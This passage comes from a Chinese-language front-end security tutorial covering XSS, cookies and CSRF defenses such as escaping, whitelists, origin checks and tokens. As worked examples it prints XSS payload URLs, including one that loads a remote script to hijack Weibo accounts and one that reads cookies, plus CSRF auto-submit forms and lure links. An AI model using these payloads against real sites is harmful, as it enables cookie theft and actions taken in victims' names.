</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>虽然代码不会立即执行，但一旦用户点击 <code>a</code> 标签时，浏览器会就会弹出“XSS”。</p> <p>小明选择了<font color="orange" size="3">白名单的方法</font>，彻底解决了这个漏洞：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// 根据项目情况进行过滤，禁止掉 &quot;javascript:&quot; 链接、非法 scheme 等</span>
allowSchemes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&quot;http&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;https&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

valid <span class="token operator">=</span> <span class="token function">isValid</span><span class="token punctuation">(</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">&quot;redirect_to&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> allowSchemes<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span>valid<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">&quot;&lt;%= escapeHTML(getParameter(&quot;</span>redirect_to<span class="token string">&quot;))%&gt;&quot;</span><span class="token operator">&gt;</span>
    跳转<span class="token operator">...</span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">&gt;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
  <span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">&quot;/404&quot;</span><span class="token operator">&gt;</span>
    跳转<span class="token operator">...</span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">&gt;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div></li> <li><p>小明选择了白名单的方法，彻底解决了这个漏洞：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// 根据项目情况进行过滤，禁止掉 &quot;javascript:&quot; 链接、非法 scheme 等</span>
allowSchemes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&quot;http&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;https&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

valid <span class="token operator">=</span> <span class="token function">isValid</span><span class="token punctuation">(</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">&quot;redirect_to&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> allowSchemes<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span>valid<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">&quot;&lt;%= escapeHTML(getParameter(&quot;</span>redirect_to<span class="token string">&quot;))%&gt;&quot;</span><span class="token operator">&gt;</span>
    跳转<span class="token operator">...</span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">&gt;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
  <span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">&quot;/404&quot;</span><span class="token operator">&gt;</span>
    跳转<span class="token operator">...</span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">&gt;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div></li> <li><p>在 onload、onerror、onclick 等事件中，注入不受控制代码。</p></li> <li><p>在 style 属性和标签中，包含类似 <code>background-image:url(&quot;javascript:...&quot;);</code> 的代码（新版本浏览器已经可以防范）。</p></li> <li><p>在 style 属性和标签中，包含类似 <code>expression(...)</code> 的 CSS 表达式代码（新版本浏览器已经可以防范）。</p></li></ul> <p>总之，如果开发者没有将用户输入的文本进行合适的过滤，就贸然插入到 HTML 中，这很容易造成注入漏洞。攻击者可以利用漏洞，构造出恶意的代码指令，进而利用恶意代码危害数据安全。</p> <h3 id="xss-攻击案例"><a href="#xss-攻击案例" class="header-anchor">#</a> XSS 攻击案例</h3> <h4 id="qq-邮箱-m-exmail-qq-com-域名反射型-xss-漏洞"><a href="#qq-邮箱-m-exmail-qq-com-域名反射型-xss-漏洞" class="header-anchor">#</a> QQ 邮箱 <a href="https://link.juejin.cn?target=http%3A%2F%2Fm.exmail.qq.com" target="_blank" rel="noopener noreferrer">m.exmail.qq.com<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> 域名反射型 XSS 漏洞</h4> <p>攻击者发现 <code>http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&amp;domain=bbbb</code> 这个 URL 的参数 <code>uin</code>、<code>domain</code> 未经转义直接输出到 HTML 中。</p> <p>于是攻击者构建出一个 URL，并引导用户去点击： <code>http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&amp;domain=bbbb%26quot%3B%3Breturn+false%3B%26quot%3B%26lt%3B%2Fscript%26gt%3B%26lt%3Bscript%26gt%3Balert(document.cookie)%26lt%3B%2Fscript%26gt%3B</code></p> <p>用户点击这个 URL 时，服务端取出 URL 参数，拼接到 HTML 响应中：</p> <div class="language-xml line-numbers-mode"><pre class="language-xml"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span>
getTop().location.href=&quot;/cgi-bin/loginpage?autologin=n&amp;errtype=1&amp;verify=&amp;clientuin=aaa&quot;+&quot;&amp;t=&quot;+&quot;&amp;d=bbbb&quot;;return false;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span>alert(document.cookie)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>&quot;+&quot;...
复制代码
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>浏览器接收到响应后就会执行 <code>alert(document.cookie)</code>，攻击者通过 JavaScript 即可窃取当前用户在 QQ 邮箱域名下的 Cookie ，进而危害数据安全。</p> <h4 id="新浪微博名人堂反射型-xss-漏洞"><a href="#新浪微博名人堂反射型-xss-漏洞" class="header-anchor">#</a> 新浪微博名人堂反射型 XSS 漏洞</h4> <p>攻击者发现 <code>http://weibo.com/pub/star/g/xyyyd</code> 这个 URL 的内容未经过滤直接输出到 HTML 中。</p> <p>于是攻击者构建出一个 URL，然后诱导用户去点击：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>http://weibo.com/pub/star/g/xyyyd&quot;&gt;&lt;script src=//xxxx.cn/image/t.js&gt;&lt;/script&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>用户点击这个 URL 时，服务端取出请求 URL，拼接到 HTML 响应中：</p> <div class="language-xml line-numbers-mode"><pre class="language-xml"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://weibo.com/pub/star/g/xyyyd<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>//xxxx.cn/image/t.js</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>&quot;&gt;按分类检索<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>
复制代码
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>浏览器接收到响应后就会加载执行恶意脚本 <code>//xxxx.cn/image/t.js</code>，在恶意脚本中利用用户的登录状态进行关注、发微博、发私信等操作，发出的微博和私信可再带上攻击 URL，诱导更多人点击，不断放大攻击范围。这种窃用受害者身份发布恶意内容，层层放大攻击范围的方式，被称为“XSS 蠕虫”。</p> <h3 id="课后作业-xss-攻击小游戏"><a href="#课后作业-xss-攻击小游戏" class="header-anchor">#</a> 课后作业：XSS 攻击小游戏</h3> <p>以下是几个 XSS 攻击小游戏，开发者在网站上故意留下了一些常见的 XSS 漏洞。玩家在网页上提交相应的输入，完成 XSS 攻击即可通关。</p> <p>在玩游戏的过程中，请各位读者仔细思考和回顾本文内容，加深对 XSS 攻击的理解。</p> <p><a href="https://link.juejin.cn?target=https%3A%2F%2Falf.nu%2Falert1" target="_blank" rel="noopener noreferrer">alert(1) to win<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> <a href="https://link.juejin.cn?target=http%3A%2F%2Fprompt.ml%2F" target="_blank" rel="noopener noreferrer">prompt(1) to win<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> <a href="https://link.juejin.cn?target=https%3A%2F%2Fxss-game.appspot.com%2F" target="_blank" rel="noopener noreferrer">XSS game<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <h2 id="_2-重点-知道哪些前端危险-如何防御"><a href="#_2-重点-知道哪些前端危险-如何防御" class="header-anchor">#</a> 2 （重点）知道哪些前端危险？如何防御</h2> <p>XSS、CSRF、网络劫持、Hybrid安全</p> <ul><li><p>XSS</p> <ul><li>存储型xss</li> <li>反射型xss</li> <li>DOM型xss</li></ul></li> <li><p>CSRF</p></li> <li><p>ClickJacking（点击劫持）</p></li> <li><p>文件上传漏洞</p></li> <li><p>不安全的第三方依赖包</p></li></ul> <img src="https://cdn.jsdelivr.net/gh/KeXiaoZhan/Images/image-20230222124119730.png" alt="image-20230222124119730" style="zoom:67%;"> <h2 id="_3-xss的原理-如何防御xss-为什么换成实体字符就好了"><a href="#_3-xss的原理-如何防御xss-为什么换成实体字符就好了" class="header-anchor">#</a> 3 XSS的原理，如何防御XSS？为什么换成实体字符就好了？</h2> <p>攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全</p> <p>防御：</p> <ul><li>输入过滤</li> <li>预防储存型和反射型XSS攻击</li> <li>预防DOM型XSS攻击</li></ul> <h2 id="_4-假如说某链接获取到你的敏感信息-发送奇怪请求到服务器-你怎么去防御-反射型xss防御"><a href="#_4-假如说某链接获取到你的敏感信息-发送奇怪请求到服务器-你怎么去防御-反射型xss防御" class="header-anchor">#</a> 4 假如说某链接获取到你的敏感信息，发送奇怪请求到服务器，你怎么去防御？(反射型XSS防御)</h2> <p>存储型和反射型 XSS 都是在服务端取出恶意代码后，插入到响应 HTML 里的，攻击者刻意编写的“数据”被内嵌到“代码”中，被浏览器所执行。</p> <p><font color="red" size="3">预防这两种漏洞，有两种常见做法：</font></p> <ul><li>改成纯前端渲染，把代码和数据分隔开。</li> <li>对 HTML 做充分转义。</li></ul> <p><strong>纯前端渲染的过程：</strong></p> <ol><li>浏览器先加载一个静态 HTML，此 HTML 中不包含任何跟业务相关的数据。</li> <li>然后浏览器执行 HTML 中的 JavaScript。</li> <li>JavaScript 通过 Ajax 加载业务数据，调用 DOM API 更新到页面上。</li></ol> <p>在纯前端渲染中，我们会明确的告诉浏览器：下面要设置的内容是文本（<code>.innerText</code>），还是属性（<code>.setAttribute</code>），还是样式（<code>.style</code>）等等。浏览器不会被轻易的被欺骗，执行预期外的代码了。</p> <p>但纯前端渲染还需注意避免 DOM 型 XSS 漏洞（例如 <code>onload</code> 事件和 <code>href</code> 中的 <code>javascript:xxx</code> 等，请参考下文”预防 DOM 型 XSS 攻击“部分）。</p> <p>在很多内部、管理系统中，采用纯前端渲染是非常合适的。但对于性能要求高，或有 <font color="red" size="3">SEO（搜索引擎优化）</font> 需求的页面，我们仍然要面对拼接 HTML 的问题。</p> <p><strong>转义 HTML</strong></p> <p>如果拼接 HTML 是必要的，就需要采用合适的转义库，对 HTML 模板各处插入点进行充分的转义。</p> <p>常用的模板引擎，如 doT.js、ejs、FreeMarker 等，对于 HTML 转义通常只有一个规则，就是把 <code>&amp; &lt; &gt; &quot; ' /</code> 这几个字符转义掉，确实能起到一定的 XSS 防护作用，但并不完善：</p> <h2 id="_5-讲一讲cookie是怎么发送到服务端-具体过程-尽量详细"><a href="#_5-讲一讲cookie是怎么发送到服务端-具体过程-尽量详细" class="header-anchor">#</a> 5 讲一讲cookie是怎么发送到服务端，具体过程，尽量详细</h2> <p>cookie的生命周期：</p> <p>1、cookie的创建:服务端通过Set-Cookie的http头要求客户端创建，并给予其规定生命长度</p> <p>2、cookie的使用:客户端每次请求都会根据path、domain通过Cookie的http头将cookie信息传送给服务端。</p> <p>cookie会随着http请求传递给服务端
服务端可修改cookie，再返回给前端
默认情况下跨域不可传递cookie</p> <p><strong>服务端操作cookie之设置cookie</strong>
在cookie-index.js中有一下代码</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// 服务端操作cookie</span>
<span class="token keyword">const</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> server <span class="token operator">=</span> http<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token comment">// 设置cookie</span>
    res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">'Set-Cookie'</span><span class="token punctuation">,</span> <span class="token string">'a=100'</span><span class="token punctuation">)</span>
    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'cookie test'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>

server<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'server listen on 3000 port'</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><ol><li>服务端操作cookie之获取cookie</li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// 获取cookie</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'cookie is'</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h2 id="_6-重点-csrf攻击"><a href="#_6-重点-csrf攻击" class="header-anchor">#</a> 6 重点：CSRF攻击</h2> <h3 id="重点-什么是csrf"><a href="#重点-什么是csrf" class="header-anchor">#</a> (重点)什么是CSRF</h3> <p><font color="red" size="3">CSRF（Cross-site request  forgery）跨站请求伪造：攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。</font>利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。</p> <p>一个典型的CSRF攻击有着如下的流程：</p> <ul><li>受害者登录a.com，并保留了登录凭证（Cookie）。</li> <li>攻击者引诱受害者访问了b.com。</li> <li>b.com 向 a.com 发送了一个请求：a.com/act=xx。浏览器会默认携带a.com的Cookie。</li> <li>a.com接收到请求后，对请求进行验证，并确认是受害者的凭证，误以为是受害者自己发送的请求。</li> <li>a.com以受害者的名义执行了act=xx。</li> <li>攻击完成，攻击者在受害者不知情的情况下，冒充受害者，让a.com执行了自己定义的操作。</li></ul> <h3 id="几种常见的攻击类型"><a href="#几种常见的攻击类型" class="header-anchor">#</a> 几种常见的攻击类型</h3> <ul><li><strong>GET类型的CSRF</strong></li></ul> <p>GET类型的CSRF利用非常简单，只需要一个HTTP请求，一般会这样利用：</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code> ![](https://awps-assets.meituan.net/mit-x/blog-images-bundle-2018b/ff0cdbee.example/withdraw?amount=10000&amp;for=hacker)
 
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>在受害者访问含有这个img的页面后，浏览器会自动向<code>http://bank.example/withdraw?account=xiaoming&amp;amount=10000&amp;for=hacker</code>发出一次HTTP请求。bank.example就会收到包含受害者登录信息的一次跨域请求。</p> <ul><li><strong>POST类型的CSRF</strong></li></ul> <p>这种类型的CSRF利用起来通常使用的是一个自动提交的表单，如：</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://bank.example/withdraw<span class="token punctuation">&quot;</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>POST</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>account<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>xiaoming<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>amount<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>10000<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>for<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hacker<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"> document<span class="token punctuation">.</span>forms<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span> 
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。</p> <p>POST类型的攻击通常比GET要求更加严格一点，但仍并不复杂。任何个人网站、博客，被黑客上传页面的网站都有可能是发起攻击的来源，后端接口不能将安全寄托在仅允许POST上面。</p> <p><strong>链接类型的CSRF</strong></p> <p>链接类型的CSRF并不常见，<font color="red" size="3">比起其他两种用户打开页面就中招的情况</font>，这种需要用户点击链接才会触发。这种类型通常是在论坛中发布的图片中嵌入恶意链接，或者以广告的形式诱导用户中招，攻击者通常会以比较夸张的词语诱骗用户点击，例如：</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://test.com/csrf/withdraw.php?amount=1000&amp;for=hacker<span class="token punctuation">&quot;</span></span> <span class="token attr-name">taget</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>_blank<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
  重磅消息！！
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span><span class="token punctuation">/&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>由于之前用户登录了信任的网站A，并且保存登录状态，只要用户主动访问上面的这个PHP页面，则表示攻击成功。</p> <h3 id="csrf的特点"><a href="#csrf的特点" class="header-anchor">#</a> CSRF的特点</h3> <ul><li>攻击一般发起在第三方网站，而不是被攻击的网站。被攻击的网站无法防止攻击发生。</li> <li><font color="red" size="3">攻击利用受害者在被攻击网站的登录凭证（cookie），冒充受害者提交操作</font>；而不是直接窃取数据。</li> <li>整个过程攻击者并不能获取到受害者的登录凭证，仅仅是“冒用”。</li> <li>跨站请求可以用各种方式：图片URL、超链接、CORS、Form提交等等。部分请求方式可以直接嵌入在第三方论坛、文章中，难以进行追踪。</li></ul> <p>CSRF通常是跨域的，因为外域通常更容易被攻击者掌控。但是如果本域下有容易被利用的功能，比如可以发图和链接的论坛和评论区，攻击可以直接在本域下进行，而且这种攻击更加危险。</p> <h3 id="防护策略"><a href="#防护策略" class="header-anchor">#</a> 防护策略</h3> <p>CSRF通常从第三方网站发起，被攻击的网站无法防止攻击发生，只能通过增强自己网站针对CSRF的防护能力来提升安全性。</p> <p><font color="red" size="3">上文中讲了CSRF的两个特点：</font></p> <ul><li>CSRF（通常）发生在第三方域名。</li> <li>CSRF攻击者不能获取到Cookie等信息，只是使用。</li></ul> <p><strong>针对这两点，我们可以专门制定防护策略，如下</strong>：</p> <ul><li>阻止不明外域的访问（个人感觉效果不咋地）
<ul><li>同源检测</li> <li>Samesite Cookie</li></ul></li> <li>提交时要求附加本域才能获取的信息
<ul><li>CSRF Token(不适用于分布式校验)</li> <li>双重Cookie验证</li></ul></li> <li>Encrypted Token Pattern</li> <li>SamesiteCookie属性</li> <li><strong>增加验证，例如密码、短信验证码、指纹</strong></li> <li>使用post接口</li></ul> <p>以下我们对各种防护方法做详细说明。</p> <h3 id="同源检测"><a href="#同源检测" class="header-anchor">#</a> 同源检测</h3> <p><font color="red" size="3">既然CSRF大多来自第三方网站，那么我们就直接禁止外域（或者不受信任的域名）对我们发起请求。</font></p> <p>那么问题来了，我们如何判断请求是否来自外域呢？</p> <p><font color="red" size="3">在HTTP协议中，每一个异步请求都会携带两个Header，用于标记来源域名：</font></p> <p>这两个Header在浏览器发起请求时，大多数情况会自动带上，并且不能由前端自定义内容。 服务器可以通过解析这两个Header中的域名，确定请求的来源域。</p> <h4 id="使用origin-header确定来源域名"><a href="#使用origin-header确定来源域名" class="header-anchor">#</a> 使用Origin Header确定来源域名</h4> <p>在部分与CSRF有关的请求中，请求的Header中会携带Origin字段。<font color="red" size="3">字段内包含请求的域名（不包含path及query）。</font></p> <p>如果Origin存在，那么直接使用Origin中的字段确认来源域名就可以。</p> <p>但是Origin在以下两种情况下并不存在：</p> <ul><li><strong>IE11同源策略：</strong> IE 11 不会在跨站CORS请求上添加Origin标头，Referer头将仍然是唯一的标识。最根本原因是因为IE 11对同源的定义和其他浏览器有不同，有两个主要的区别，可以参考<a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy#IE_Exceptions" target="_blank" rel="noopener noreferrer">MDN Same-origin_policy#IE_Exceptions<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><strong>302重定向：</strong> 在302重定向之后Origin不包含在重定向的请求中，因为Origin可能会被认为是其他来源的敏感信息。对于302重定向的情况来说都是定向到新的服务器上的URL，因此浏览器不想将Origin泄漏到新的服务器上。</li></ul> <h4 id="使用referer-header确定来源域名"><a href="#使用referer-header确定来源域名" class="header-anchor">#</a> 使用Referer Header确定来源域名</h4> <p>根据HTTP协议，<font color="red" size="3">在HTTP头中有一个字段叫Referer，记录了该HTTP请求的来源地址</font>。 对于Ajax请求，图片和script等资源请求，Referer为发起请求的页面地址。对于页面跳转，Referer为打开页面历史记录的前一个页面地址。因此我们使用Referer中链接的Origin部分可以得知请求的来源域名。</p> <p>这种方法并非万无一失，Referer的值是由浏览器提供的，虽然HTTP协议上有明确的要求，但是每个浏览器对于Referer的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer  值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不是很安全。在部分情况下，攻击者可以隐藏，甚至修改自己请求的Referer。</p> <h3 id="csrf-token"><a href="#csrf-token" class="header-anchor">#</a> CSRF Token</h3> <p><font color="red" size="3">前面讲到CSRF的另一个特征是，攻击者无法直接窃取到用户的信息（Cookie，Header，网站内容等），仅仅是冒用Cookie中的信息。</font></p> 